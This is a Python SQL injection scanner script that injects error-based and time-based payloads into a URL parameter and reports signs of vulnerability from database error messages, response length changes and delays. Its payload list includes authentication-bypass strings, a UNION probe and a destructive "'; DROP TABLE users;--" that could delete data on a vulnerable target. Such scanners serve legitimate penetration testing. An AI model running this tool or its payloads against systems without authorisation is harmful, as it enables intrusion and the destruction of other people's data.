import requests
import time
import urllib.parse

# Config
DEFAULT_TIMEOUT = 10  # seconds for HTTP requests
HEADERS = {"User-Agent": "VulnScanner/1.0 (+educational-testing)"}

# Error signatures commonly found in DB error messages (lowercase)
SQL_ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "warning: mysql", "unclosed quotation mark",
    "ora-", "oracle", "syntax error", "psql", "pg_query", "sqlite3",
    "sqlstate", "invalid query"
]

# Error-based payloads (cover common DBs + unions)
ERROR_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1-- ",
    "' UNION SELECT NULL-- ",
    "'; DROP TABLE users;--",
    "' OR SLEEP(0)-- ",  # harmless variant for control
]

# Time-based payloads (blind SQLi attempt)
TIME_PAYLOADS = [
    "' OR SLEEP(5)-- ",                     # MySQL
    "'; SELECT PG_SLEEP(5);--",             # PostgreSQL
    "' OR (SELECT sleep(5))--",             # generic attempt
]

def _ensure_param(url):
    """
    Ensure the URL has a query parameter we can inject into.
    If no query parameters exist, append a dummy param: ?id=1
    """
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if qs:
        return url  # already has params
    sep = '&' if parsed.query else '?'
    return url + sep + "id=1"

def _inject(url, param_value):
    """
    Replace the first parameter's value with the param_value string.
    Works for URLs like ...?a=1&b=2
    """
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not qs:
        # append id
        new_qs = [("id", param_value)]
    else:
        # replace first param's value
        new_qs = [(qs[0][0], param_value)] + qs[1:]
    new_query = urllib.parse.urlencode(new_qs, doseq=True)
    rebuilt = parsed._replace(query=new_query).geturl()
    return rebuilt

def _safe_get(url, timeout=DEFAULT_TIMEOUT):
    try:
        r = requests.get(url, headers=HEADERS, timeout=timeout, verify=True)
        return r
    except requests.exceptions.RequestException as e:
        return None

def _has_error_signature(text):
    if not text:
        return False
    t = text.lower()
    for sig in SQL_ERROR_SIGNATURES:
        if sig in t:
            return True
    return False

def analyze(url, timeout=DEFAULT_TIMEOUT):
    """
    Main entry. Returns a list of findings.
    Each finding is a dict:
    { "payload": ..., "type": "error"|"time", "evidence": ..., "confidence": 0-100 }
    """
    findings = []

    # normalize
    target = _ensure_param(url)

    # baseline: request with a safe good value
    normal_url = _inject(target, "1")
    normal_resp = _safe_get(normal_url, timeout=timeout)
    normal_text = normal_resp.text if normal_resp is not None else ""
    normal_len = len(normal_text) if normal_text else 0

    # ERROR-BASED TESTING
    for payload in ERROR_PAYLOADS:
        test_url = _inject(target, payload)
        resp = _safe_get(test_url, timeout=timeout)
        if resp is None:
            continue
        text = resp.text.lower()
        # 1) check error signatures
        if _has_error_signature(text) and not _has_error_signature(normal_text.lower()):
            # higher confidence if error is only present with payload
            findings.append({
                "payload": payload,
                "type": "error-based",
                "evidence": "DB error signature found in response",
                "detail": test_url,
                "confidence": 80
            })
            continue
        # 2) check big change in response length (simple heuristic)
        if abs(len(text) - normal_len) > max(100, normal_len * 0.2):
            # significant difference vs baseline → suspicious
            findings.append({
                "payload": payload,
                "type": "error-based",
                "evidence": "Large response change vs baseline (length diff)",
                "detail": test_url,
                "confidence": 40
            })

    # TIME-BASED (BLIND) TESTING
    # Measure baseline response time first
    baseline_times = []
    for _ in range(2):
        t0 = time.time()
        r = _safe_get(normal_url, timeout=timeout)
        t1 = time.time()
        baseline_times.append(t1 - t0)
    baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5

    for payload in TIME_PAYLOADS:
        test_url = _inject(target, payload)
        t0 = time.time()
        r = _safe_get(test_url, timeout=timeout + 6)  # allow extra time
        t1 = time.time()
        elapsed = t1 - t0
        # if elapsed >> baseline (e.g., baseline + 4s), suspicious
        if elapsed > baseline_avg + 3.0:  # 3 seconds margin
            findings.append({
                "payload": payload,
                "type": "time-based",
                "evidence": f"Delay observed: {elapsed:.2f}s vs baseline {baseline_avg:.2f}s",
                "detail": test_url,
                "confidence": 85 if elapsed > baseline_avg + 4.5 else 60
            })

    # Consolidate / return
    return findings

# Quick-run helper when this file is executed directly
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python sql_injection.py <target_url>")
        print("Example: python sql_injection.py http://testphp.vulnweb.com/")
        sys.exit(1)
    target = sys.argv[1].strip()
    print(f"[+] Testing SQL Injection on {target}")
    out = analyze(target)
    if not out:
        print("[+] No SQLi findings detected (low confidence).")
    else:
        for f in out:
            print(f"[!] Type: {f['type']}  Payload: {f['payload']}")
            print(f"    Evidence: {f['evidence']}")
            print(f"    URL: {f['detail']}")
            print(f"    Confidence: {f['confidence']}")
            print("----")
